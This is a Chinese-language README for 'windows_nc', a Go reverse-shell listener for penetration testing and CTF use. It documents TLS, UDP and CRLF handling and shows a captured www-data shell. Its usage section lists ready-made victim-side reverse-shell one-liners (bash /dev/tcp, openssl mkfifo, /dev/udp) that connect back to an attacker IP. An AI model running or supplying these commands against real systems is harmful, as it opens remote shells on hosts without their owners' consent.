# 🐚 windows_nc - Windows 反弹 Shell 监听器

<p align="center">
  <img alt="Go版本" src="https://img.shields.io/badge/Go-1.20%2B-blue">
  <img alt="多平台支持" src="https://img.shields.io/badge/平台-Windows%2FLinux%2FmacOS-green">
  <img alt="开源协议" src="https://img.shields.io/badge/许可-MIT-orange">
  <img alt="功能" src="https://img.shields.io/badge/功能-TCP%2FUDP%2FTLS-purple">
</p>

专为渗透测试和 CTF 设计的 Netcat 替代品，解决 Windows 缺失 nc 及反弹 Shell 换行符不兼容痛点。

---

## 📖 简介

`windows_nc` 是一个用 **Go** 语言编写的轻量级、跨平台反弹 Shell 监听工具。它不仅完美替代了 `nc` 的基础监听功能，还针对反弹 Shell 场景进行了深度优化：

- 自动处理 Windows/Linux 换行符差异
- 支持 TLS 加密反弹（自动生成证书）
- UDP 会话锁定功能

---

## ✨ 核心功能

| 功能 | 描述 |
|------|------|
| 🚀 零依赖运行 | 单文件编译，无需安装 OpenSSL 或 Python 环境，Windows/Linux 开箱即用 |
| 🧠 智能换行处理 | Smart Mode 自动剔除 Windows 输入的 `\r`，完美兼容 Linux 靶机 Shell |
| 🔒 TLS 自动化 | 内置临时证书生成器，无需手动签发证书即可接收 openssl 加密 Shell |
| 📡 UDP 会话锁定 | 智能锁定首个 UDP 数据包源地址，建立稳定的伪连接会话 |
| ⚡ 极速响应 | 强制禁用 Nagle 算法（TCP NoDelay），告别交互式 Shell 的卡顿延迟 |
| 📝 审计日志 | 支持 `-log` 参数，实时将所有 Shell 交互内容留存为审计文件 |
| 🛠️ 广泛兼容 | 完美支持 Bash、Python、PHP、Perl、PowerShell 等各种 Reverse Shell Payload |

---

## 🚀 快速开始

### 安装步骤

由于是单文件 Go 程序，你可以直接运行或编译。

```bash
# 1. 确保安装了 Go 环境 (推荐 1.20+)
go version

# 2. 直接运行
go run simple_nc.go -p 4444

# 3. 或编译为可执行文件 (Windows 示例)
go build -o nc.exe simple_nc.go
```

---

## 🛠️ 参数详解

| 参数 | 默认值 | 说明 | 示例 |
|------|--------|------|------|
| `-p` | 4444 | 本地监听端口 | `-p 8080` |
| `-u` | false | 启用 UDP 模式 (nc -u) | `-u` |
| `-tls` | false | 启用 TLS/SSL 模式 (OpenSSL) | `-tls` |
| `-smart` | true | 智能换行模式 (自动移除 `\r`) | `-smart=false`（关闭） |
| `-log` | "" | 将会话保存到文件 | `-log shell.log` |
| `-v` | false | 详细模式 (显示数据流字节数) | `-v` |
| `-h` | false | 显示帮助信息 | `-h` |

---

## 📊 使用场景示例

### 1. 标准 Linux 反弹 (TCP)

**攻击端 (SimpleNC):**
```bash
./nc.exe -p 4444
```

**靶机 (Victim):**
```bash
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```

---

### 2. 加密流量反弹 (TLS/SSL)

**攻击端 (SimpleNC):**
```bash
./nc.exe -p 8443 -tls
```

**靶机 (Victim):**
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.5:8443 > /tmp/s; rm /tmp/s
```

---

### 3. UDP 协议反弹

**攻击端 (SimpleNC):**
```bash
./nc.exe -p 53 -u
```

**靶机 (Victim):**
```bash
sh -i >& /dev/udp/192.168.1.5/53 0>&1
```

---

## 📋 输出示例

当成功接收到反弹 Shell 时，界面如下：

```
[*] Starting SimpleNC Listener...
[*] Mode: tcp | Port: 4444 | Smart Newlines: true
[*] Listening on 0.0.0.0:4444 (TCP)...

[+] Connection received from 10.10.10.128:54321
[!] Shell session started. Press Ctrl+C to exit.
---------------------------------------------------
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html $ whoami
www-data
/var/www/html $
```

---

## 🔧 技术特性

### I/O 优化

- **TCP NoDelay**: 默认对 TCP 连接开启 `SetNoDelay(true)`，禁用 Nagle 算法，确保每一个按键字符都能立即发送给靶机，这对 `vi` 或 `top` 等交互式命令至关重要。
- **Buffer Management**: 使用优化的缓冲区大小，防止高并发数据流下的内存溢出或数据截断。

### 智能兼容性 (Smart Mode)

Windows 的换行符是 CRLF (`\r\n`)，而 Linux 是 LF (`\n`)。直接用 Windows 的 CMD/PowerShell 连接 Linux 反弹 Shell 时，发送的命令往往带有 `\r`，导致 Linux 提示 `command not found` 或显示异常。

`windows_nc` 在读取 Windows 标准输入时，会自动识别并剔除 `\r`，确保发送给 Linux 的是纯净的命令。

---

## ⚠️ 免责声明

使用本工具前请务必阅读并同意以下条款：

- **授权测试**：本工具仅供网络安全专业人员在获得明确授权的渗透测试或 CTF 演练中使用。
- **合规使用**：严禁将本工具用于任何非法的网络攻击或未经授权的系统访问。
- **风险自担**：开发者不对因使用本工具造成的任何直接或间接损失承担责任。

---

## 🛡️ windows_nc - 让反弹 Shell 连接更简单、更稳定
